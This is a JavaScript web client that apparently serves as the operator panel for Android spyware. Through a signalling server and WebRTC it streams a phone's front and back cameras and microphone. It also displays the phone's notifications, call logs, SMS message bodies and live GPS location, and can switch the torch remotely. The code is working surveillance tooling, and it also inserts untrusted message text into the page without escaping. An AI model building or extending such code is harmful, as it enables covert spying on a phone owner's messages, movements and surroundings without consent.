// Signaling server URL
const SIGNALING_URL = 'https://hypewebrtc.onrender.com';

const socket = io(SIGNALING_URL, {
  reconnection: true,
  reconnectionAttempts: Infinity,
  reconnectionDelay: 2000,
  reconnectionDelayMax: 8000,
  randomizationFactor: 0.4
});

const videoFront       = document.getElementById('remoteVideoFront');
const videoBack        = document.getElementById('remoteVideoBack');
const statusDiv        = document.getElementById('status');
const notificationsDiv = document.getElementById('notifications');
const callLogsDiv      = document.getElementById('callLogs');
const smsDiv           = document.getElementById('smsMessages');
const debugLog         = document.getElementById('debugLog');
const retryButton      = document.getElementById('retryButton');

let peer          = null;
let myId          = null;
let androidClientId = null;
let map           = null;
let marker        = null;
let audioTrack    = null;
let frontVideoTrack = null;
let backVideoTrack  = null;
let activeDownloads = {};

// ── ICE config — mirrors Android side ────────────────────────────────────────
const RTC_CONFIG = {
  iceServers: [
    { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] },
    { urls: ['turn:freestun.net:3478', 'turns:freestun.net:5349'], username: 'free', credential: 'free' },
    {
      urls: ['turn:global.relay.metered.ca:80', 'turn:global.relay.metered.ca:443', 'turns:global.relay.metered.ca:443?transport=tcp'],
      username: 'openrelayproject',
      credential: 'openrelayproject'
    }
  ],
  iceCandidatePoolSize: 10
};

// ── Helpers ───────────────────────────────────────────────────────────────────
function updateStatus(msg) {
  console.log(msg);
  statusDiv.textContent = msg;
  logDebug(msg);
  retryButton.style.display = msg.includes('Failed') ? 'block' : 'none';
}

function logDebug(msg) {
  const el = document.createElement('div');
  el.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  debugLog.prepend(el);
  while (debugLog.children.length > 50) debugLog.removeChild(debugLog.lastChild);
}

function addNotification(n) {
  const el = document.createElement('div'); el.className = 'notification';
  el.innerHTML = `<p><strong>App:</strong> ${n.appName}</p><p><strong>Title:</strong> ${n.title}</p><p><strong>Text:</strong> ${n.text}</p><p class="timestamp">${n.timestamp}</p>`;
  notificationsDiv.prepend(el);
  while (notificationsDiv.children.length > 10) notificationsDiv.removeChild(notificationsDiv.lastChild);
}

function addCallLog(c) {
  const el = document.createElement('div'); el.className = 'call-log';
  el.innerHTML = `<p><strong>Number:</strong> ${c.number}</p><p><strong>Type:</strong> ${c.type}</p><p><strong>Date:</strong> ${c.date}</p><p><strong>Duration:</strong> ${c.duration}s</p>`;
  callLogsDiv.prepend(el);
  while (callLogsDiv.children.length > 10) callLogsDiv.removeChild(callLogsDiv.lastChild);
}

function addSmsMessage(s) {
  const el = document.createElement('div'); el.className = 'sms-message';
  el.innerHTML = `<p><strong>Address:</strong> ${s.address}</p><p><strong>Type:</strong> ${s.type}</p><p><strong>Date:</strong> ${s.date}</p><p><strong>Body:</strong> ${s.body}</p>`;
  smsDiv.prepend(el);
  while (smsDiv.children.length > 50) smsDiv.removeChild(smsDiv.lastChild);
}

function initMap() {
  map = L.map('mapContainer').setView([0, 0], 13);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '\u00a9 OpenStreetMap contributors'
  }).addTo(map);
}

function updateMap(lat, lng) {
  if (!map) initMap();
  if (marker) marker.setLatLng([lat, lng]);
  else { marker = L.marker([lat, lng]).addTo(map); marker.bindPopup('Device Location').openPopup(); }
  map.setView([lat, lng], 13);
}

// ── Video stream assignment ──────────────────────────────────────────────────
function assignTrack(track) {
  // Match by id label set on Android
  if (track.kind === 'audio') {
    audioTrack = track;
  } else if (track.kind === 'video') {
    // track.id on Android is set as 'front_camera' or 'back_camera'
    if (!frontVideoTrack) {
      frontVideoTrack = track;
    } else if (!backVideoTrack) {
      backVideoTrack = track;
    }
  }
  updateStreams();
}

function updateStreams() {
  if (frontVideoTrack) {
    const s = new MediaStream([frontVideoTrack]);
    if (audioTrack) s.addTrack(audioTrack);
    videoFront.srcObject = s;
    videoFront.onloadedmetadata = () => videoFront.play().catch(() => videoFront.setAttribute('controls', 'true'));
  }
  if (backVideoTrack) {
    const s = new MediaStream([backVideoTrack]);
    videoBack.srcObject = s;
    videoBack.onloadedmetadata = () => videoBack.play().catch(() => videoBack.setAttribute('controls', 'true'));
  }
  updateStatus('Receiving remote streams');
}

// ── Peer connection ──────────────────────────────────────────────────────────
function createPeer(fromId) {
  if (peer) { try { peer.close(); } catch(e) {} peer = null; }
  peer = new RTCPeerConnection(RTC_CONFIG);

  // Add receive-only transceivers to match Android's send-only
  peer.addTransceiver('video', { direction: 'recvonly' });
  peer.addTransceiver('video', { direction: 'recvonly' });
  peer.addTransceiver('audio', { direction: 'recvonly' });

  peer.ontrack = e => {
    logDebug(`Track received: kind=${e.track.kind} id=${e.track.id}`);
    assignTrack(e.track);
  };

  peer.onicecandidate = e => {
    if (!e.candidate || !androidClientId) return;
    socket.emit('signal', { to: androidClientId, from: myId, signal: { candidate: e.candidate } });
  };

  peer.oniceconnectionstatechange = () => {
    const s = peer.iceConnectionState;
    logDebug(`ICE state: ${s}`);
    updateStatus(`ICE: ${s}`);
    if (s === 'failed') {
      logDebug('ICE failed — attempting restart via re-connection');
      // Close and null so next offer rebuilds
      peer.close(); peer = null;
      frontVideoTrack = null; backVideoTrack = null; audioTrack = null;
      updateStatus('ICE failed — waiting for Android to re-offer');
    } else if (s === 'connected' || s === 'completed') {
      updateStatus('Video stream connected ✓');
    }
  };

  peer.onsignalingstatechange = () => logDebug(`Signaling state: ${peer.signalingState}`);
  return peer;
}

// ── Torch control ────────────────────────────────────────────────────────────
function sendTorch(on) {
  socket.emit('torch', { on });
  logDebug(`Torch command sent: ${on}`);
}

// Expose to HTML buttons
window.torchOn  = () => sendTorch(true);
window.torchOff = () => sendTorch(false);

// ── Socket events ─────────────────────────────────────────────────────────────
socket.on('connect', () => updateStatus('Connected to signaling server'));
socket.on('disconnect', reason => {
  updateStatus(`Disconnected: ${reason} — reconnecting...`);
  logDebug(`Socket disconnected: ${reason}`);
});
socket.on('connect_error', err => updateStatus(`Connect error: ${err.message} — retrying...`));

socket.on('id', id => {
  myId = id;
  logDebug(`My socket ID: ${myId}`);
  socket.emit('identify', 'web');
  socket.emit('web-client-ready', myId);
  updateStatus('Announced readiness');
});

socket.on('android-client-ready', id => {
  androidClientId = id;
  logDebug(`Android client ready: ${id}`);
  updateStatus('Android connected — waiting for stream...');
});

socket.on('android-client-disconnected', () => {
  updateStatus('Android disconnected');
  if (peer) { peer.close(); peer = null; }
  videoFront.srcObject = null;
  videoBack.srcObject  = null;
  frontVideoTrack = null; backVideoTrack = null; audioTrack = null;
  notificationsDiv.innerHTML = '';
  callLogsDiv.innerHTML = '';
  smsDiv.innerHTML = '';
  if (marker) { marker.remove(); marker = null; }
  logDebug('Android client disconnected — peer cleaned up');
});

socket.on('notification', data => { if (data.notification) addNotification(data.notification); });
socket.on('call_log',     data => { if (data.call_logs)    data.call_logs.forEach(c => addCallLog(c)); });
socket.on('sms',          data => { if (data.sms_messages) data.sms_messages.forEach(s => addSmsMessage(s)); });
socket.on('location',     data => updateMap(data.latitude, data.longitude));

socket.on('signal', async data => {
  const { from, signal } = data;
  logDebug(`Signal from ${from}: ${signal.type || 'candidate'}`);

  if (!androidClientId || androidClientId !== from) {
    androidClientId = from;
    logDebug(`Set androidClientId: ${from}`);
  }

  if (!peer) {
    logDebug('No peer — creating new RTCPeerConnection');
    createPeer(from);
  }

  try {
    if (signal.type === 'offer') {
      // If we're in wrong state, reset
      if (peer.signalingState !== 'stable' && peer.signalingState !== 'have-remote-offer') {
        logDebug(`Resetting peer due to state: ${peer.signalingState}`);
        createPeer(from);
      }
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      await peer.setLocalDescription(answer);
      socket.emit('signal', { to: from, from: myId, signal: { type: 'answer', sdp: answer.sdp } });
      logDebug('Answer sent to Android');
    } else if (signal.candidate) {
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Signal handling error:', err);
    logDebug(`Signal error: ${err.message}`);
    // Reset peer on error so next offer can rebuild cleanly
    if (peer) { peer.close(); peer = null; }
  }
});

socket.on('error', err => updateStatus(`Server error: ${err.message}`));

retryButton.addEventListener('click', () => socket.connect());

// Init
updateStatus('Connecting to server...');
logDebug('Web client starting...');
initMap();
